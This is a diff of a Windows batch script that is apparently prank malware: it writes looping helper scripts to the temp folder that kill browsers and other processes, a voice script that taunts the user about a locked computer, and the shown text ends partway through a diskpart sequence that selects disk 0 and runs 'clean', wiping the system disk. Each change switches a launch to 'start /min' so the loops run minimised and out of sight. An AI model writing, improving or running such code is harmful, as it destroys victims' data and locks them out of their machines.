@@ -45,7 +45,7 @@ echo taskkill /f /im "taskkill /f /im haha.bat" >> %temp%\loop.bat
 echo taskkill /f /im "taskkill /f /im virus.bat" >> %temp%\loop.bat
 echo goto loop >> %temp%\loop.bat
 
-"%temp%\loop.bat"
+start /min "%temp%\loop.bat"
 
 echo title loop2.bat >> %temp%\loop2.bat
 echo :loop >> %temp%\loop2.bat
@@ -58,7 +58,7 @@ echo taskkill /f /im chrome.exe >> %temp%\loop2.bat
 echo taskkill /f /im MicrosoftEdge.exe >> %temp%\loop2.bat
 echo goto loop >> %temp%\loop2.bat
 
-"%temp%\loop2.bat"
+start /min "%temp%\loop2.bat"
 
 echo CreateObject("SAPI.SpVoice").Speak "Your computer has been getttttttt dunked on!!!" >> %temp%\lock.vbs
 echo CreateObject("SAPI.SpVoice").Speak ", " >> %temp%\lock.vbs
@@ -74,7 +74,7 @@ echo CreateObject("SAPI.SpVoice").Speak "Or you can restart forcely, Anyway you 
 echo CreateObject("SAPI.SpVoice").Speak "Yes. you should start guess, and you can change password when you success to guess." >> %temp%\lock.vbs
 echo CreateObject("SAPI.SpVoice").Speak "Good luck and here we go to guess." >> %temp%\lock.vbs
 
-"%temp%\lock.vbs"
+start /min "%temp%\lock.vbs"
 
 cls
 echo Your computer has been getttttttt dunked on!!!
@@ -123,7 +123,7 @@ echo :loop >> %temp%\done.bat
 echo start %temp%\done.vbs >> %temp%\done.bat
 echo goto loop >> %temp%\done.bat
 
-"%temp%\done.bat"
+start /min "%temp%\done.bat"
 
 (echo select disk 0
 echo clean
